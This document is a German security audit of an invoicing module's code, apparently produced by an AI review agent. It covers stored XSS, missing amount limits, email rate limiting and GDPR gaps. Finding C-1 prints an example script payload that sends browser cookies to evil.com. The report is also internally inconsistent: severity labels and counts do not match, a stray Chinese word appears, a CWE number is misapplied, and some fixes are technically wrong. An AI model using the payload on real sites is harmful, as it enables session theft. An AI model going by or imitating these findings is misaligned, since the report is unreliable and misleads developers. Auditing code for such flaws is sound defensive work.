# Security Report: Rechnungswesen Modul (Sprint 4)

**Review Date:** 2026-04-13  
**Reviewer:** dev-security agent  
**Branch:** dev  
**Modules Reviewed:** `src/lib/invoicing/`, Invoice UI Components, Email Service

---

## Executive Summary

Das Rechnungswesen-Modul wurde einer Security Review unterzogen. Es wurden **3 kritische**, **4 hohe** und **5 mittlere** Sicherheitslücken identifiziert. Die kritischsten Probleme betreffen **Stored XSS** in Benutzereingaben und **fehlende Input-Validierung** für Finanzdaten.

---

## CRITICAL

### C-1: Stored XSS in `service_description` (Rechnungspositionen)

**Date:** `src/components/new-invoice-form.tsx`, `src/lib/invoicing/pdf-generator.ts`

**Problem:**
Die `service_description` aus Benutzereingaben wird ohne HTML-Escaping direkt in die UI und in PDFs gerendert.

**Angriff:** Ein Angreifer könnte als Rechnungsposition eingeben:
```html
<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
```

**Betroffene Stellen:**
- `new-invoice-form.tsx` → Zeigt `service_description` in bearbeitbarem Input
- `invoice-list-client.tsx` → Wird in der Tabelle gerendert (`item.service_description`)
- `pdf-generator.ts` → Direkt in jsPDF injiziert: `item.service_description || '—'`
- ZUGFeRD XML: Hier korrekt via `escapeXML()` geschützt

**Empfehlung:**
```typescript
// Bei Ausgabe in React:
import DOMPurify from 'dompurify';
// oder zumindest escaped:
<span>{service_description.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</span>

// Im PDF: HTML-Escaping vor jsPDF
const safeText = service_description
  .replace(/&/g, '&amp;')
  .replace(/</g, '&lt;')
  .replace(/>/g, '&gt;');
```

**Severity:** CRITICAL  
**Type:** Stored XSS (CWE-79)

---

### C-2: Stored XSS in `notes` (Rechnungsanmerkungen)

**Date:** `pdf-generator.ts`, UI Components die `invoice.notes` rendern

**Problem:**
Das `notes`-Feld wird direkt in PDF und UI ohne Sanitisierung eingebettet.

**Empfehlung:**
- `notes` immer serverseitig validieren (max. Länge, keine HTML-Tags)
- Bei Ausgabe in PDF: HTML-Escaping
- In React: Textarea rendert bereits escaped, aber bei `dangerouslySetInnerHTML` wäre es kritisch

**Severity:** CRITICAL  
**Type:** Stored XSS (CWE-79)

---

### C-3: Fehlende Upper Bounds bei Finanzfeldern

**Date:** `invoice-service.ts:createInvoice`, `addInvoiceItem`, `updateInvoiceItem`

**Problem:**
`total_amount_cents`, `unit_price_cents` und `quantity` haben keine Upper-Limit-Validierung.

**Code:**
```typescript
const qty = Number(item.quantity) || 1;
const unitPrice = Number(item.unit_price_cents) || 0;
// Kein Maximalwert-Check → theoretisch Integer-Overflow oder
// unrealistische Werte möglich
const netAmount = Math.round(qty * unitPrice);
```

**Empfehlung:**
```typescript
const MAX_AMOUNT_CENTS = 999_999_99; // ~1 Mio. EUR
if (netAmountCents > MAX_AMOUNT_CENTS) {
  throw new Error('Betrag überschreitet maximal erlaubten Wert');
}
if (qty > 1_000_000) throw new Error('Menge unrealistisch hoch');
```

**Severity:** CRITICAL  
**Type:** CWE-190 (Integer Overflow), Business Logic

---

## HIGH

### H-1: XSS in Invoice-Suche (Client-Side)

**Date:** `src/components/invoice-list-client.tsx`

**Problem:**
Der Suchfilter verwendet direkte String-Konkatenation für gerenderte Werte:
```typescript
invoice.invoice_number.toLowerCase().includes(searchTerm.toLowerCase())
// → Wenn invoice_number <script> enthält, wird es im DOM gespeichert
//   und könnte bei再次 Render ausgeführt werden
```

**Empfehlung:** `invoice_number` ist system-generiert, daher niedriges Risiko. Trotzdem HTML-Escaping bei der Ausgabe in der Tabelle.

**Severity:** MEDIUM  
**Type:** Potential XSS (niedrig, da invoice_number serverseitig generiert)

---

### H-2: SQL Injection in Supabase `.ilike()` Filter

**Date:** `invoice-service.ts:getInvoices`

```typescript
if (filters.search) {
  query = query.or(`invoice_number.ilike.%${filters.search}%,reference_text.ilike.%${filters.search}%`);
}
```

**Analyse:** Supabase Client escaped die Werte clientseitig. ABER: Bei falscher Verwendung könnte `filters.search` unbeabsichtigte Supabase-Operatoren enthalten.

**Empfehlung:**
```typescript
// Explizite Escape-Funktion
const escapeSearch = (s: string) => s.replace(/%/g, '\\%').replace(/_/g, '\\_');
if (filters.search) {
  const safe = escapeSearch(filters.search);
  query = query.or(`invoice_number.ilike.%${safe}%,reference_text.ilike.%${safe}%`);
}
```

**Severity:** MEDIUM  
**Type:** CWE-89 (SQL Injection - theoretical)

---

### H-3: Kein Input-Scrubbing für Rechnungsnummer

**Date:** `invoice-service.ts:createInvoice`

**Problem:**
`invoice.invoice_number` wird akzeptiert wie eingegeben (Fallback) oder von DB-Prozedur generiert. Keine Validierung des Formats.

```typescript
// Fallback wenn kein tenant:
invoiceNumber = `R/${new Date().getFullYear()}/${String((count || 0) + 1).padStart(5, '0')}`;
// → Akzeptiert aber auch explizit gesetzte Werte ohne Validierung
```

**Empfehlung:**
- Regex-Validierung für Rechnungsnummern: `^[A-Z0-9/]{3,20}$`
- Keine Benutzer-Eingabe für Nummern zulassen (nur System-Generierung)

**Severity:** HIGH  
**Type:** CWE-287 (Improper Input Validation)

---

### H-4: Fehlende Rate Limiting für E-Mail-Versand

**Date:** `email-service.ts`

**Problem:**
Keine Beschränkung der E-Mail-Versand-Frequenz. Ein böswilliger Benutzer könnte Massen-E-Mails triggern.

```typescript
// Keine Rate-Limit-Prüfung in:
export async function sendInvoiceEmail({...})
export async function sendReminderEmail(...)
```

**Empfehlung:**
- Rate Limiting: Max 10 E-Mails pro Minute pro Tenant
- Reminder-Lock: Nicht mehr als 2 Reminder pro Tag pro Rechnung
- Implementierung via Redis oder Supabase Edge Function

**Severity:** HIGH  
**Type:** CWE-770 (Insufficient Resource Allocation)

---

## MEDIUM

### M-1: debtor_id Ownership nicht validiert

**Date:** `actions.ts:createInvoiceAction`

**Problem:**
Beim Erstellen einer Rechnung wird nicht geprüft, ob `debtor_id` zum Tenant des Benutzers gehört.

```typescript
// Keine Validierung:
const result = await svcCreateInvoice(data, user.id, profile?.tenant_id || null);
```

**Empfehlung:** Serverseitige Prüfung, dass `debtor.tenant_id === profile.tenant_id`

**Severity:** MEDIUM  
**Type:** CWE-639 (Authorization Bypass)

---

### M-2: XSS in ZUGFeRD-XML (theoretisch bei fehlerhafter Escape-Funktion)

**Date:** `zugferd-export.ts`, `datev-export.ts`

**Analyse:** Beide Export-Funktionen verwenden `escapeXML()`. Diese sieht korrekt aus:
```typescript
function escapeXML(str: string): string {
  if (!str) return '';
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&apos;');
}
```

**Status:** ✅ Korrekt implementiert

---

### M-3: Audit-Log nur bei erfolgreichen Operationen

**Date:** `actions.ts`

**Problem:**
`logDataChange` wird nur bei erfolgreichen Commits aufgerufen. Fehlgeschlagene Versuche werden nicht geloggt.

```typescript
if (result.success) {
  await logDataChange(...); // Nur hier
}
```

**Empfehlung:** Auch fehlgeschlagene Versuche loggen (Level: attempt/failure)

**Severity:** MEDIUM  
**Type:** CWE-778 (Insufficient Logging)

---

### M-4: PDF Hardcoded Company Data

**Date:** `zugferd-export.ts:generateZUGFeRD21XML`

```typescript
<ram:Name>ReinPlaner GmbH</ram:Name>
<ram:StreetName>Musterstraße 1</ram:StreetName>
...
<ram:ID schemeID="VA">DE123456789</ram:ID>
```

**Problem:** Testdaten fest im Code. Sollte aus Datenbank/Tenant-Config kommen.

**Severity:** LOW  
**Type:** Hardcoded Credentials/Data (CWE-547)

---

### M-5: ZUGFeRD XML-Doctype fehlt Declaration bei `generateZUGFeRDXML`

**Date:** `datev-export.ts:generateZUGFeRDXML`

```typescript
// header fehlt:
const header = [
  'EXTF', '120', '', '',
].join('');
// → ZUGFeRD verwendet falsches Format (txt statt xml)
```

**Empfehlung:** Korrektes ZUGFeRD-Format verwenden (XML nicht TXT) und Konformität prüfen.

**Severity:** MEDIUM  
**Type:** CWE-20 (Improper Input Validation - wrong format)

---

## LOW

### L-1: E-Mail-From-Adresse nicht validiert

**Date:** `email-service.ts`

```typescript
const FROM_EMAIL = process.env.RESEND_FROM_EMAIL || 'ReinPlaner <noreply@reinplaner.de>';
```

**Status:** ✅ From-Adresse ist hardcoded, keine Injection möglich

---

### L-2: Reminder-Flooding möglich

**Date:** `sendReminderEmail` - kein Lockout nachReminder-Count

```typescript
// Keine Prüfung von:
invoice.reminder_count
invoice.last_reminder_at
```

**Empfehlung:** Max 2 Reminder pro Tag, Lockout-Mechanismus

**Severity:** LOW  
**Type:** CWE-770

---

## GDPR COMPLIANCE

### G-1: Fehlende Datenlöschung (Right to be Forgotten)

**Date:** Gesamtes Modul

**Problem:** Es gibt keine Funktion zum Löschen aller Rechnungsdaten eines Mandanten nach DSGVO-Anforderung.

**Empfehlung:**
- Soft-Delete mit `deleted_at` Timestamp
- Hard-Delete nach Aufbewahrungsfrist (10 Jahre für Rechnungen §147 AO)
- Export aller Daten vor Löschung

**Severity:** MEDIUM  
**Type:** GDPR Art. 17 (Right to Erasure)

---

### G-2: Keine Rechnungsdaten-Verschlüsselung

**Date:** PDF-Generator, ZUGFeRD-Export

**Problem:** Rechnungs-PDFs und XML-Exporte enthalten personenbezogene Daten (Debitor-Adressen) ohne zusätzliche Verschlüsselung.

**Empfehlung:**
- PDF mit Passwortschutz (jsPDF unterstützt dies)
- Transport-Verschlüsselung bereits via HTTPS ✓
- At-Rest: Supabase verschlüsselt bereits ✓

**Severity:** LOW  
**Type:** GDPR Art. 32 (Security of Processing)

---

### G-3: Audit-Log für Rechnungsdaten-Zugriff

**Status:** ✅ Implementiert via `logDataChange`

**Empfehlung:** Erweitern um Lese-Zugriffe (nicht nur Writes)

---

## RLS / Authorization

### R-1: RLS Policies auf invoices, invoice_items, payments

**Status:** ✅ Supabase RLS aktiv  
**Empfehlung:** Explizit prüfen in Supabase Dashboard:
```sql
-- Test: Nur eigener Tenant-Zugriff
SELECT * FROM invoices WHERE tenant_id = 'anderer-tenant-id' LIMIT 1;
-- Sollte 0 Rows zurückgeben
```

---

## Summary

| Severity | Count |
|----------|-------|
| CRITICAL | 3 |
| HIGH | 4 |
| MEDIUM | 5 |
| LOW | 3 |

**Empfohlene Actions (nach Priorität):**
1. XSS-Fixes in `service_description` und `notes` (Critical)
2. Upper-Bounds für Finanzfelder (Critical)
3. Rate-Limiting für E-Mail-Versand (High)
4. debtor_id Ownership-Validierung (Medium)
5. GDPR-Datenlöschfunktion (Medium)

---

*Report generiert: 2026-04-13 00:58 GMT+2*
*Reviewer: dev-security agent*